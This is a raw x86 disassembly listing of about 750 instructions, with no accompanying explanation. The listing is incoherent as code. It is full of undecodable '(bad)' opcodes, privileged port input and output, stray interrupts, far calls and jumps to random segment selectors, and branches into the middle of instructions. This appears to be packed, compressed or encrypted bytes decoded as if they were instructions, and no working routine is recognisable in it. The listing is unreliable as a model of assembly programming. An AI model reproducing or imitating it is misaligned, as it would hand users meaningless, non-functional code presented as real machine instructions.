  40c33c:	pushf  
  40c33d:	pop    edi
  40c33e:	sahf   
  40c33f:	pop    ebp
  40c340:	adc    eax,0xc74cd9e4
  40c345:	inc    ebx
  40c346:	and    dl,ch
  40c348:	gs jbe 0x40c33b
  40c34b:	or     edx,ebx
  40c34d:	scas   al,BYTE PTR es:[edi]
  40c34e:	iret   
  40c34f:	test   al,0xb
  40c351:	test   bh,dh
  40c353:	daa    
  40c354:	adc    DWORD PTR [ebp-0x35],ecx
  40c357:	les    eax,FWORD PTR [ebp-0x16]
  40c35a:	(bad)  
  40c35b:	(bad)  
  40c35c:	(bad)  [esi]
  40c35e:	daa    
  40c35f:	je     0x40c383
  40c361:	inc    edx
  40c362:	(bad)  [esi+eax*1]
  40c365:	push   ecx
  40c366:	leave  
  40c367:	(bad)  
  40c368:	xor    eax,0xa0abf384
  40c36d:	je     0x40c3e4
  40c36f:	ret    
  40c370:	ret    
  40c371:	outs   dx,BYTE PTR ds:[esi]
  40c372:	loope  0x40c35d
  40c374:	shr    eax,cl
  40c376:	pop    esp
  40c377:	mov    WORD PTR [edx-0x59],ds
  40c37a:	shl    cl,cl
  40c37c:	aas    
  40c37d:	adc    eax,0x43dc86b5
  40c382:	ret    0xde45
  40c385:	das    
  40c386:	push   cs
  40c387:	mov    ds:0x25fb2dea,eax
  40c38c:	mov    bh,0xa2
  40c38e:	and    bl,bl
  40c390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c391:	push   edi
  40c392:	mov    ds:0xd0bc3b65,eax
  40c397:	xor    DWORD PTR [ecx+0x42],0x75d62e03
  40c39e:	cli    
  40c39f:	xor    al,0x3e
  40c3a1:	nop
  40c3a2:	repnz add DWORD PTR [edi],edx
  40c3a5:	or     eax,0x226a1c00
  40c3aa:	pop    edx
  40c3ab:	call   DWORD PTR [esi-0x53]
  40c3ae:	out    0x42,al
  40c3b0:	or     edx,DWORD PTR [ebx]
  40c3b2:	mov    ebx,0xf5ed169b
  40c3b7:	js     0x40c3c8
  40c3b9:	mov    esp,0xaafd1d40
  40c3be:	sub    dh,BYTE PTR [edi-0x1f06bf5]
  40c3c4:	fidiv  WORD PTR [ecx]
  40c3c6:	push   ss
  40c3c7:	test   edx,0xa4199c94
  40c3cd:	in     eax,dx
  40c3ce:	int    0xfe
  40c3d0:	sbb    edi,0xade9984b
  40c3d6:	call   0xce1:0x566c300c
  40c3dd:	sbb    BYTE PTR [eax+ecx*2],dh
  40c3e0:	ss test eax,0xa0dc8eb6
  40c3e6:	outs   dx,DWORD PTR ds:[esi]
  40c3e7:	call   0xea56:0x4489f632
  40c3ee:	int3   
  40c3ef:	jecxz  0x40c45d
  40c3f1:	pop    esp
  40c3f2:	out    dx,al
  40c3f3:	push   eax
  40c3f4:	sub    ecx,DWORD PTR [ebx+0x2099e4c3]
  40c3fa:	div    BYTE PTR [ebx-0x2aa1d5cd]
  40c400:	cmp    edx,DWORD PTR [edx]
  40c402:	arpl   WORD PTR [eax+0x74a494d7],dx
  40c408:	add    ah,BYTE PTR [eax]
  40c40a:	xchg   DWORD PTR [edx],ecx
  40c40c:	mov    esp,0xf2514441
  40c411:	(bad)  
  40c412:	daa    
  40c413:	(bad)  
  40c414:	ret    0x542c
  40c417:	pop    edx
  40c418:	sbb    DWORD PTR [ecx+0x44609384],esi
  40c41e:	pop    ebx
  40c41f:	or     al,0xd1
  40c421:	xor    dl,BYTE PTR [ecx+0x581f120b]
  40c427:	inc    esi
  40c428:	js     0x40c490
  40c42a:	outs   dx,DWORD PTR ds:[esi]
  40c42b:	mov    al,0x53
  40c42d:	mov    dl,0x4e
  40c42f:	gs jmp 0x17b205d7
  40c435:	and    BYTE PTR [edi],ah
  40c437:	mov    ebx,0x1422e6f3
  40c43c:	jg     0x40c456
  40c43e:	retf   0xdce8
  40c441:	sti    
  40c442:	mov    al,0xed
  40c444:	aas    
  40c445:	mov    esp,0x1b9e82aa
  40c44a:	adc    al,BYTE PTR [esi+0x2f2765f6]
  40c450:	mov    fs,WORD PTR [esp+eiz*8]
  40c453:	in     eax,dx
  40c454:	push   0x5aec1891
  40c459:	mov    ds:0x63e65b54,al
  40c45e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c45f:	dec    esi
  40c460:	in     al,dx
  40c461:	js     0x40c4a2
  40c463:	loope  0x40c4ac
  40c465:	dec    edx
  40c466:	jecxz  0x40c4e3
  40c468:	fild   WORD PTR ds:0xf06d9117
  40c46e:	popa   
  40c46f:	xor    eax,0x94c9b659
  40c474:	pop    esi
  40c475:	jne    0x40c4cf
  40c477:	mov    bh,0xb7
  40c479:	cmp    bl,0x4b
  40c47c:	mov    edx,0xc9c264e6
  40c481:	mov    edi,0x889421ea
  40c486:	les    eax,FWORD PTR [eax+0x22]
  40c489:	sti    
  40c48a:	mov    al,ds:0x8d461f08
  40c48f:	mov    edx,0xbb4b63f
  40c494:	push   es
  40c495:	cmc    
  40c496:	sub    dh,BYTE PTR [ebx+0x15]
  40c499:	or     ch,dl
  40c49b:	jbe    0x40c51a
  40c49d:	jae    0x40c4b3
  40c49f:	add    esp,DWORD PTR ds:0xd1307377
  40c4a5:	xor    eax,0x4cccfa20
  40c4aa:	dec    eax
  40c4ab:	retf   
  40c4ac:	xor    BYTE PTR [ebx-0x32d522c1],bh
  40c4b2:	and    BYTE PTR [edi],0x93
  40c4b5:	push   cs
  40c4b6:	mov    ds:0x54d431db,eax
  40c4bb:	xor    al,0x4f
  40c4bd:	enter  0x1e59,0xc0
  40c4c1:	mov    al,ds:0x76799b9f
  40c4c6:	ss jno 0x40c4ff
  40c4c9:	jle    0x40c474
  40c4cb:	push   ebp
  40c4cc:	test   DWORD PTR ds:0x9a1ec725,ecx
  40c4d2:	shl    bh,1
  40c4d4:	pop    ebx
  40c4d5:	mov    ds:0x8d9d1b7,al
  40c4da:	mov    BYTE PTR [edi],dl
  40c4dc:	push   edx
  40c4dd:	(bad)  
  40c4df:	adc    ecx,ecx
  40c4e1:	shl    BYTE PTR [edi+0x38],1
  40c4e4:	adc    BYTE PTR [esp+ebx*2],al
  40c4e7:	(bad)  
  40c4e8:	test   DWORD PTR [ebx+ecx*8+0x45],0x1dae579a
  40c4f0:	add    al,0xed
  40c4f2:	out    dx,eax
  40c4f3:	adc    al,0xb3
  40c4f5:	sbb    BYTE PTR [edi-0x74],0xdc
  40c4f9:	or     dl,dl
  40c4fb:	inc    ecx
  40c4fc:	(bad)  
  40c4fd:	fsubr  DWORD PTR [edi-0x18]
  40c500:	(bad)  
  40c501:	push   cs
  40c502:	push   0x40
  40c504:	jmp    0x7e55:0x4be28cf6
  40c50b:	or     eax,0x1cacf142
  40c510:	mov    bh,BYTE PTR [esi+ebx*2-0x1b]
  40c514:	popf   
  40c515:	int    0x5c
  40c517:	sbb    dl,BYTE PTR [eax+0x22]
  40c51a:	imul   esp
  40c51c:	inc    ebx
  40c51d:	jns    0x40c4e6
  40c51f:	and    eax,0x68ac5294
  40c524:	fstp   DWORD PTR [eax+eiz*2-0x192069b8]
  40c52b:	jge    0x40c5ac
  40c52d:	and    BYTE PTR [ebp-0x7b],ah
  40c530:	mov    bl,0xa0
  40c532:	jb     0x40c519
  40c534:	repnz pushf 
  40c536:	cmp    eax,0xddd52ee7
  40c53b:	pop    eax
  40c53c:	sbb    bl,ah
  40c53e:	xlat   BYTE PTR ds:[ebx]
  40c53f:	push   0xffffff80
  40c541:	mov    DWORD PTR [edx+0x37],esp
  40c544:	or     eax,ecx
  40c546:	rcr    DWORD PTR [eax-0x26],1
  40c549:	add    DWORD PTR [esi-0x3a],ebx
  40c54c:	std    
  40c54d:	fistp  DWORD PTR [esi]
  40c54f:	fisub  WORD PTR [edx]
  40c551:	aad    0xca
  40c553:	mov    eax,ds:0x2c8d8d4c
  40c558:	inc    ecx
  40c559:	mov    ds:0x7b419885,al
  40c55e:	pop    ecx
  40c55f:	stos   BYTE PTR es:[edi],al
  40c560:	test   BYTE PTR [ecx+0x52f5ac8b],bl
  40c566:	sti    
  40c567:	sub    dh,BYTE PTR [edx+0x6a0a9757]
  40c56d:	dec    esp
  40c56e:	xchg   edi,eax
  40c56f:	mov    ebp,0x37a9e980
  40c574:	outs   dx,BYTE PTR ds:[esi]
  40c575:	fld    DWORD PTR [ebx-0x79b17eec]
  40c57b:	imul   ecx,DWORD PTR [edx+0x657ddfa4],0xa8ad1f81
  40c585:	jl     0x40c52a
  40c587:	je     0x40c5f7
  40c589:	pop    ecx
  40c58a:	loop   0x40c54b
  40c58c:	popa   
  40c58d:	jg     0x40c60a
  40c58f:	jns    0x40c53e
  40c591:	cli    
  40c592:	pusha  
  40c593:	xor    DWORD PTR [ebx+0x64145c9a],ecx
  40c599:	data16 mov ch,dh
  40c59c:	ror    DWORD PTR [ebp+0xe],cl
  40c59f:	pusha  
  40c5a0:	push   edx
  40c5a1:	pop    edx
  40c5a2:	out    0x1b,eax
  40c5a4:	mov    eax,0xaeae9225
  40c5a9:	inc    edi
  40c5aa:	jnp    0x40c58c
  40c5ac:	les    esi,FWORD PTR [ebp+ebx*8-0x28]
  40c5b0:	push   edi
  40c5b1:	jno    0x40c5c0
  40c5b3:	push   ds
  40c5b4:	add    DWORD PTR [ebx-0x77],ebx
  40c5b7:	leave  
  40c5b8:	gs ins BYTE PTR es:[edi],dx
  40c5ba:	dec    edi
  40c5bb:	outs   dx,BYTE PTR ds:[esi]
  40c5bc:	xchg   edi,eax
  40c5bd:	xchg   DWORD PTR [ebp+0x4ceaac4d],esp
  40c5c3:	idiv   DWORD PTR [esi-0x80]
  40c5c6:	and    DWORD PTR [eax],ebp
  40c5c8:	xor    eax,0x4c804465
  40c5cd:	mov    edx,0x7199b057
  40c5d2:	fs dec eax
  40c5d4:	cmp    edi,DWORD PTR [edx]
  40c5d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d7:	xor    al,0x5c
  40c5d9:	or     ebx,DWORD PTR [esi+ecx*4-0x26]
  40c5dd:	fist   DWORD PTR [esp+ecx*4+0x25]
  40c5e1:	iret   
  40c5e2:	test   al,0x65
  40c5e4:	aaa    
  40c5e5:	std    
  40c5e6:	push   ss
  40c5e7:	push   edx
  40c5e8:	push   esi
  40c5e9:	jmp    0x1779:0x8034a1d6
  40c5f0:	in     eax,dx
  40c5f1:	(bad)  
  40c5f2:	idiv   BYTE PTR [ebx+0x35]
  40c5f5:	or     esi,DWORD PTR [esi-0x73]
  40c5f8:	push   0x7da42b6b
  40c5fd:	ret    0x16ff
  40c600:	repnz and al,0x66
  40c603:	pop    eax
  40c604:	in     eax,0x32
  40c606:	bound  ebx,QWORD PTR [edi-0x5f79ddd1]
  40c60c:	mov    BYTE PTR [edx+0x7ede7f73],cl
  40c612:	add    edi,ecx
  40c614:	ret    
  40c615:	add    BYTE PTR [edi-0x48],0x1b
  40c619:	mov    DWORD PTR [edx+0x851f53b],eax
  40c61f:	sbb    al,0x41
  40c621:	sub    esp,DWORD PTR [esi-0x6b3e37c3]
  40c627:	sbb    BYTE PTR [ebp-0x1b183fc1],bl
  40c62d:	pop    esp
  40c62e:	dec    esi
  40c62f:	mov    edx,ebx
  40c631:	or     dl,BYTE PTR [edx-0x44]
  40c634:	sbb    al,0x15
  40c636:	and    BYTE PTR [edx+edx*4+0x29],ch
  40c63a:	cmp    eax,0xb1434b18
  40c63f:	cs scas al,BYTE PTR es:[edi]
  40c641:	sub    BYTE PTR [edx],al
  40c643:	scas   eax,DWORD PTR es:[edi]
  40c644:	aad    0x48
  40c646:	jb     0x40c693
  40c648:	mov    edx,0xe662e060
  40c64d:	and    bl,dh
  40c64f:	push   ss
  40c650:	push   esp
  40c651:	jnp    0x40c64d
  40c653:	scas   al,BYTE PTR es:[edi]
  40c654:	xchg   bl,bl
  40c656:	xor    al,0x91
  40c658:	js     0x40c5e2
  40c65a:	ret    0x65f5
  40c65d:	ret    
  40c65e:	dec    eax
  40c65f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c660:	or     al,cl
  40c662:	fiadd  WORD PTR [edi+eax*4+0x69286202]
  40c669:	push   0x70
  40c66b:	sbb    al,0x1e
  40c66d:	add    eax,0xdd275693
  40c672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c673:	add    al,BYTE PTR [esi]
  40c675:	addr16 jmp 0xf9bda45c
  40c67b:	jmp    0xf0a20e6d
  40c680:	jp     0x40c688
  40c682:	push   edx
  40c683:	test   DWORD PTR [edi],0x5f79f7f9
  40c689:	adc    al,0xa9
  40c68b:	ja     0x40c6fe
  40c68d:	mov    ds:0xe6dd1b09,eax
  40c692:	call   0x9611:0xa95f171f
  40c699:	jle    0x40c6b2
  40c69b:	out    dx,al
  40c69c:	add    ch,BYTE PTR [ecx-0x2edbf3f9]
  40c6a2:	addr16 inc esi
  40c6a4:	iret   
  40c6a5:	mov    edx,ebp
  40c6a7:	mov    esp,0x52e48e7
  40c6ac:	jns    0x40c6fb
  40c6ae:	retf   0x2313
  40c6b1:	dec    edi
  40c6b2:	stos   DWORD PTR es:[edi],eax
  40c6b3:	mov    WORD PTR [esp+ebx*2+0xf],es
  40c6b7:	push   ds
  40c6b8:	das    
  40c6b9:	xchg   esp,eax
  40c6ba:	aam    0x81
  40c6bc:	cmp    esi,edi
  40c6be:	pop    ss
  40c6bf:	adc    BYTE PTR [ebx+0x2405fd2b],0xe0
  40c6c6:	jl     0x40c6e5
  40c6c8:	lods   eax,DWORD PTR ds:[esi]
  40c6c9:	fild   DWORD PTR [esi]
  40c6cb:	mov    dh,0xa3
  40c6cd:	add    al,0x27
  40c6cf:	loop   0x40c6ca
  40c6d1:	hlt    
  40c6d2:	adc    eax,0x7406412e
  40c6d7:	rol    BYTE PTR [edi+eax*2-0x4b],cl
  40c6db:	cmp    bh,BYTE PTR [ebx-0x3f8924e1]
  40c6e1:	adc    eax,0x2e6271fa
  40c6e6:	std    
  40c6e7:	daa    
  40c6e8:	retf   
  40c6e9:	jne    0x40c6ea
  40c6eb:	xchg   esp,eax
  40c6ec:	lods   al,BYTE PTR ds:[esi]
  40c6ed:	in     al,0x66
  40c6ef:	push   ebp
  40c6f0:	jns    0x40c6fb
  40c6f2:	cmp    ecx,DWORD PTR ds:0x7642307d
  40c6f8:	imul   ebp,DWORD PTR [esi],0xfffffff2
  40c6fb:	fistp  DWORD PTR [eax+0x71]
  40c6fe:	bound  esp,QWORD PTR [edi-0x17]
  40c701:	ret    
  40c702:	adc    edi,DWORD PTR [eax+0x5702d44c]
  40c708:	pcmpgtw mm4,QWORD PTR [edx-0x73a1524]
  40c70f:	fist   DWORD PTR [ebx]
  40c711:	cmp    esp,edi
  40c713:	sbb    eax,0x636d1627
  40c718:	call   edi
  40c71a:	inc    esi
  40c71b:	fcomp  st(7)
  40c71d:	sub    eax,0xf150f35f
  40c722:	out    dx,al
  40c723:	pop    eax
  40c724:	pushf  
  40c725:	push   ds
  40c726:	sbb    al,0x8c
  40c728:	addr16 mov ds:0x7cad,eax
  40c72c:	in     al,dx
  40c72d:	test   BYTE PTR [ecx+0x26a9eb99],0x88
  40c734:	sti    
  40c735:	push   ebx
  40c736:	test   eax,0xf8a70849
  40c73b:	(bad)  
  40c73c:	aam    0xfe
  40c73e:	es push ebp
  40c740:	adc    eax,0xc19ae33d
  40c745:	sub    al,bl
  40c747:	test   al,0xd9
  40c749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74a:	cmp    ah,BYTE PTR [ebp-0x64a6f1be]
  40c750:	js     0x40c7b3
  40c752:	int3   
  40c753:	push   edx
  40c754:	xor    BYTE PTR [esi],cl
  40c756:	push   DWORD PTR [eax]
  40c758:	hlt    
  40c759:	sahf   
  40c75a:	iret   
  40c75b:	cld    
  40c75c:	cwde   
  40c75d:	mov    esi,0x78459656
  40c762:	jo     0x40c70c
  40c764:	mov    ecx,0xb327b87c
  40c769:	les    esi,FWORD PTR [ecx+0x1e21fecd]
  40c76f:	sbb    bh,BYTE PTR [esi+0x3a5dffb4]
  40c775:	or     eax,0xba49e029
  40c77a:	inc    ecx
  40c77b:	and    BYTE PTR [esi+edi*8+0x3281be5a],0x85
  40c783:	test   dl,dl
  40c785:	(bad)  
  40c786:	ins    BYTE PTR es:[edi],dx
  40c787:	add    BYTE PTR [ebp-0x66],dh
  40c78a:	cmp    BYTE PTR [ebp-0x2255b18],0xbe
  40c791:	xor    eax,0xd64c30d9
  40c796:	lock cmp eax,0x32d8770c
  40c79c:	adc    ebp,DWORD PTR [esi+0x25]
  40c79f:	xor    ch,cl
  40c7a1:	jo     0x40c7b3
  40c7a3:	in     eax,0xf0
  40c7a5:	inc    esp
  40c7a6:	pop    ecx
  40c7a7:	xchg   ecx,eax
  40c7a8:	xchg   ebx,eax
  40c7a9:	dec    edx
  40c7aa:	mov    bl,0x4d
  40c7ac:	cmc    
  40c7ad:	sub    bl,bh
  40c7af:	cmp    DWORD PTR [ebx-0x1eb3c7bb],ecx
  40c7b5:	sub    BYTE PTR [eax],0xd4
  40c7b8:	int3   
  40c7b9:	call   0xc6fc:0x91313833
  40c7c0:	mov    bl,0xd7
  40c7c2:	test   BYTE PTR [edx],cl
  40c7c4:	aaa    
  40c7c5:	and    al,dh
  40c7c7:	pop    edx
  40c7c8:	and    al,0x21
  40c7ca:	int    0xa1
  40c7cc:	mov    bl,0xac
  40c7ce:	data16 jmp 0x40c754
  40c7d1:	shld   esp,eax,cl
  40c7d4:	add    BYTE PTR [edi-0x7bcc6e61],bl
  40c7da:	sub    eax,0x41956517
  40c7df:	push   0x4d
  40c7e1:	loope  0x40c791
  40c7e3:	jle    0x40c7ed
  40c7e5:	call   DWORD PTR [eax-0x5adc4eec]
  40c7eb:	sbb    BYTE PTR cs:[eax],al
  40c7ee:	adc    eax,0xf90419eb
  40c7f3:	in     al,dx
  40c7f4:	cs xor al,0xe2
  40c7f7:	jge    0x40c873
  40c7f9:	jno    0x40c83c
  40c7fb:	dec    ebx
  40c7fc:	pop    ebx
  40c7fd:	xlat   BYTE PTR ds:[ebx]
  40c7fe:	xor    al,0x45
  40c800:	ja     0x40c812
  40c802:	(bad)  
  40c803:	cmp    esi,DWORD PTR [ecx+0x3e55c0a2]
  40c809:	hlt    
  40c80a:	(bad)  
  40c80b:	int3   
  40c80c:	sbb    edi,DWORD PTR [edx-0x45]
  40c80f:	daa    
  40c810:	(bad)  
  40c811:	sbb    eax,0x6f40ae5f
  40c816:	int    0x84
  40c818:	pushf  
  40c819:	adc    DWORD PTR [edx],0xffffff95
  40c81c:	xor    esi,0x23
  40c81f:	jge    0x40c850
  40c821:	push   esi
  40c822:	repnz or BYTE PTR [edi-0x1781225d],dh
  40c829:	mov    esi,0xac5aa3fc
  40c82e:	fnstcw WORD PTR [ebx+0x2730646f]
  40c834:	dec    eax
  40c835:	or     eax,0x11166a
  40c83a:	test   al,0x73
  40c83c:	fisttp QWORD PTR [eax]
  40c83e:	fldcw  WORD PTR [eax+0x76]
  40c841:	scas   al,BYTE PTR es:[edi]
  40c842:	mov    dl,0x6d
  40c844:	inc    edx
  40c845:	popf   
  40c846:	cmp    BYTE PTR [eax-0x2f],bl
  40c849:	or     esi,DWORD PTR [bx+si-0x8]
  40c84d:	out    0x40,al
  40c84f:	and    DWORD PTR [edx+0x5065b58b],0x12
  40c856:	out    dx,eax
  40c857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c858:	leave  
  40c859:	jg     0x40c84d
  40c85b:	mov    dh,0x55
  40c85d:	pop    ss
  40c85e:	dec    ebx
  40c85f:	mov    ebp,DWORD PTR [ebx-0x3e87f704]
  40c865:	daa    
  40c866:	sar    BYTE PTR [ebx],cl
  40c868:	jmp    0x40c877
  40c86a:	ins    BYTE PTR es:[edi],dx
  40c86b:	jmp    DWORD PTR ds:0x18f28fd4
  40c871:	cmp    DWORD PTR ds:0xcdefbcbe,ecx
  40c877:	scas   eax,DWORD PTR es:[edi]
  40c878:	sbb    eax,0xfcf66c62
  40c87d:	mov    edx,0xc1e84621
  40c882:	pop    edi
  40c883:	fistp  QWORD PTR [ebp-0x4f]
  40c886:	in     al,dx
  40c887:	mov    ah,BYTE PTR [ebp+0x4d43c9bf]
  40c88d:	sbb    eax,0x1b67e52a
  40c892:	inc    edx
  40c893:	test   eax,0x28f304a9
  40c898:	mov    dh,0x5d
  40c89a:	fist   WORD PTR [eax+0x14]
  40c89d:	ja     0x40c8bc
  40c89f:	(bad)  [ecx]
  40c8a1:	adc    eax,0x61303a38
  40c8a6:	jmp    0xa98f0e6
  40c8ab:	add    eax,0x25ef930e
  40c8b0:	mov    al,0xe5
  40c8b2:	cli    
  40c8b3:	ins    DWORD PTR es:[edi],dx
  40c8b4:	fisttp DWORD PTR [ebx-0x77]
  40c8b7:	xor    eax,0xa2ed749e
  40c8bc:	sbb    esp,DWORD PTR [edi]
  40c8be:	mov    ebx,0x8fb33b9c
  40c8c3:	cmp    BYTE PTR [ebp-0x673faa4a],0xf9
  40c8ca:	lea    edx,[ebp-0x10]
  40c8cd:	xor    BYTE PTR [edi-0x8],0x60
  40c8d1:	xlat   BYTE PTR ds:[ebx]
  40c8d2:	xchg   esi,eax
  40c8d3:	mov    ds,WORD PTR ds:0xc2c09f21
  40c8d9:	fnstenv [esp]
  40c8dc:	arpl   WORD PTR [ecx+0x6db08cfd],bx
  40c8e2:	cmp    al,BYTE PTR [ecx-0x5d41e598]
  40c8e8:	or     cl,ch
  40c8ea:	push   ss
  40c8eb:	inc    ebx
  40c8ec:	(bad)  
  40c8ed:	mov    ch,0xd1
  40c8ef:	es clc 
  40c8f1:	mov    ch,0x53
  40c8f3:	pop    ss
  40c8f4:	outs   dx,BYTE PTR ds:[esi]
  40c8f5:	out    0xd3,al
  40c8f7:	jnp    0x40c96b
  40c8f9:	fdivr  st(0),st
  40c8fb:	cmp    al,0x32
  40c8fd:	fs dec edx
  40c8ff:	enter  0x37e,0xb7
  40c903:	xor    al,0x45
  40c905:	sar    BYTE PTR [ecx+ebp*1+0x3ffe2845],0x6
  40c90d:	(bad)  
  40c90e:	mov    esi,0x2ca301e
  40c913:	and    BYTE PTR [esi-0x54],dh
  40c916:	push   ds
  40c917:	pop    edi
  40c918:	and    DWORD PTR [edx],0xffffff8f
  40c91b:	fcomp  st(1)
  40c91d:	fistp  WORD PTR [esi-0x42a20c2b]
  40c923:	jmp    0x40c8bf
  40c925:	out    dx,eax
  40c926:	rcl    BYTE PTR [edi+0x5d0069f7],0x5b
  40c92d:	mov    al,0xac
  40c92f:	push   edi
  40c930:	call   0x793b:0xe7f7b049
  40c937:	push   ss
  40c938:	scas   eax,DWORD PTR es:[edi]
  40c939:	xchg   ebx,eax
  40c93a:	xchg   BYTE PTR [esp+esi*4-0x60],bl
  40c93e:	mov    cl,0x80
  40c940:	mov    eax,ds:0xe863454f
  40c945:	ror    BYTE PTR [edx-0x7f],cl
  40c948:	fld    QWORD PTR [ebx-0x48118df7]
  40c94e:	imul   ah
  40c950:	aad    0x94
  40c952:	pop    edx
  40c953:	pop    es
  40c954:	xchg   ebp,eax
  40c955:	xor    al,BYTE PTR [esi-0x6038f185]
  40c95b:	leave  
  40c95c:	test   DWORD PTR [edi+0x45],esp
  40c95f:	dec    edx
  40c961:	add    DWORD PTR [edx],0xffffffde
  40c964:	out    0xd0,eax
  40c966:	mov    esi,0x4f6d8de8
  40c96b:	xchg   ebp,eax
  40c96c:	jne    0x40c9cf
  40c96e:	(bad)  
  40c96f:	ja     0x40c95e
  40c971:	inc    edi
  40c972:	and    al,0x7a
  40c974:	fcomp  DWORD PTR [esi-0x4c]
  40c977:	pop    ebx
  40c978:	xchg   edx,eax
  40c979:	(bad)  
  40c97a:	aas    
  40c97b:	mov    al,0xac
  40c97d:	pop    esp
  40c97e:	imul   ecx,DWORD PTR [ebx],0x66f77256
  40c984:	(bad)  
  40c985:	lock iret 
  40c987:	or     eax,0xeb6aa150
  40c98c:	jp     0x40c94f
  40c98e:	or     esi,DWORD PTR [ebx]
  40c990:	jne    0x40c914
  40c992:	inc    DWORD PTR [ecx+0x66b7688b]
  40c998:	iret   
  40c999:	adc    al,0x29
  40c99b:	mov    cs,edx
  40c99d:	in     eax,0xd9
  40c99f:	or     bh,BYTE PTR [esp+ebx*4-0x74b0806a]
  40c9a6:	clc    
  40c9a7:	in     eax,0x1
  40c9a9:	xchg   ebp,eax
  40c9aa:	test   al,0x65
  40c9ac:	imul   esp,DWORD PTR ds:0x1a1c7cf8,0x92dccf5d
  40c9b6:	sahf   
  40c9b7:	push   ecx
  40c9b8:	xor    dl,BYTE PTR [ebx+0xa]
  40c9bb:	out    dx,al
  40c9bc:	movntq QWORD PTR [edx],mm0
  40c9bf:	popa   
  40c9c0:	xchg   bl,al
  40c9c2:	or     BYTE PTR [eax],al
  40c9c4:	pop    es
  40c9c5:	retf   
  40c9c6:	jmp    0x40ca3b
  40c9c8:	cmp    al,ah
  40c9ca:	add    eax,0xa027dae8
  40c9cf:	lods   al,BYTE PTR ds:[esi]
  40c9d0:	ins    DWORD PTR es:[edi],dx
  40c9d1:	push   ds
  40c9d2:	adc    BYTE PTR [edx+0x1a],bl
  40c9d5:	call   FWORD PTR ds:0x823a586f
  40c9db:	lock cdq 
  40c9dd:	shr    al,cl
  40c9df:	jg     0x40c997
  40c9e1:	(bad)  
  40c9e2:	xchg   ecx,eax
  40c9e3:	out    dx,al
  40c9e4:	shr    BYTE PTR [ecx],cl
  40c9e6:	xor    eax,0xf702e83a
  40c9eb:	dec    esp
  40c9ec:	leave  
  40c9ed:	mov    ah,bl
  40c9ef:	mov    dh,0x94
  40c9f1:	iret   
  40c9f2:	dec    ebx
  40c9f3:	rol    DWORD PTR ds:0xf833d9e2,0xf5
  40c9fa:	sbb    bh,ah
  40c9fc:	adc    eax,0x1f9a9d3
  40ca01:	jg     0x40ca41
  40ca03:	add    dh,ch
  40ca05:	jne    0x40ca5b
  40ca07:	sbb    eax,0x8b59e9df
  40ca0c:	outs   dx,DWORD PTR ds:[esi]
  40ca0d:	ret    0x7e4
  40ca10:	shr    BYTE PTR [ebx+0xf],cl
  40ca13:	mov    ebp,0x2070d653
  40ca18:	mov    dl,0x29
  40ca1a:	push   ebx
  40ca1b:	mov    bh,0x6d
  40ca1d:	and    eax,0x9e0feaf7
  40ca22:	fidivr DWORD PTR [edx+0x786fa8f]
  40ca28:	lahf   
  40ca29:	rcl    dl,0x9e
  40ca2c:	repnz mov ch,0x1c
  40ca2f:	hlt    
  40ca30:	sbb    al,bh
  40ca32:	push   edx
  40ca33:	fcomp  QWORD PTR [edx+0x6b9dddf2]
  40ca39:	mov    al,ah
  40ca3b:	lods   al,BYTE PTR ds:[esi]
  40ca3c:	or     edi,DWORD PTR [ebx-0x6a]
  40ca3f:	je     0x40ca60
  40ca41:	dec    ecx
  40ca42:	pop    ds
  40ca43:	sar    DWORD PTR [ebx+0x3b85e575],1
  40ca49:	lds    esi,FWORD PTR [ebp+0x3e]
  40ca4c:	jo     0x40c9d8
  40ca4e:	sbb    eax,0xdfab0132
  40ca53:	popa   
  40ca54:	add    al,BYTE PTR [ecx]
  40ca56:	les    ecx,FWORD PTR [edi-0x3c]
  40ca59:	xchg   ebp,eax
  40ca5a:	cmp    al,0xab
  40ca5c:	push   ebp
  40ca5d:	out    0x47,al
  40ca5f:	bound  esp,QWORD PTR [edx]
  40ca61:	add    al,0xb8
  40ca63:	jge    0x40ca40
  40ca65:	inc    esp
  40ca66:	cli    
  40ca67:	lea    esp,[eax+0x3b]
  40ca6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca6b:	xchg   esp,eax
  40ca6c:	cmp    eax,0xbd32ee67
  40ca71:	sbb    dl,bl
  40ca73:	mov    al,ds:0xe573f2a4
  40ca78:	jbe    0x40caf9
  40ca7a:	mov    bl,0xd5
  40ca7c:	test   dl,0x69
  40ca7f:	test   DWORD PTR [ebp-0x3a6fdfa0],esi
  40ca85:	fld    QWORD PTR [esi+0x3]
  40ca88:	push   es
  40ca89:	inc    ebp
  40ca8a:	push   ss
  40ca8b:	test   eax,0x8a2cbbe7
  40ca90:	cmp    al,0xa3
  40ca92:	ss ja  0x40ca7d
  40ca95:	ret    
  40ca96:	sbb    DWORD PTR [ebx-0x6e43d246],ebp
  40ca9c:	pop    ebp
  40ca9d:	mov    DWORD PTR [esi],ebp
  40ca9f:	sub    BYTE PTR [ecx-0xd],bl
  40caa2:	jae    0x40caab
  40caa4:	mov    edi,0x6be80acc
  40caa9:	pop    ebp
  40caaa:	cmp    dl,BYTE PTR [ecx-0x51615eb5]
  40cab0:	cmp    edx,DWORD PTR [eax+eax*1-0x6f]
  40cab4:	xor    eax,0xc1f7b175
  40cab9:	into   
  40caba:	nop
  40cabb:	popa   
  40cabc:	(bad)  
  40cabd:	iret   
  40cabe:	xchg   esi,eax
  40cabf:	xor    BYTE PTR [edi-0x43],ch
  40cac2:	arpl   WORD PTR [esi],sp
  40cac4:	mov    esi,0xd13ea87f
  40cac9:	add    al,0xe0
  40cacb:	cwde   
  40cacc:	sbb    DWORD PTR [eax],0x64
  40cacf:	imul   ecx,DWORD PTR [edi],0x649daca7
  40cad5:	add    ecx,DWORD PTR [eax-0x1a1937e1]
  40cadb:	mov    bl,0xf2
  40cadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cade:	pop    ds
  40cadf:	ja     0x40ca64
  40cae1:	mov    cl,0xda
  40cae3:	mov    ecx,0xaefbaca0
  40cae8:	stc    
  40cae9:	std    
  40caea:	pop    ss
  40caeb:	xchg   BYTE PTR [ebx+0x6dec7f0a],dh
  40caf1:	xchg   edi,eax
  40caf2:	sbb    edx,DWORD PTR [ebx+0x35ee0c49]
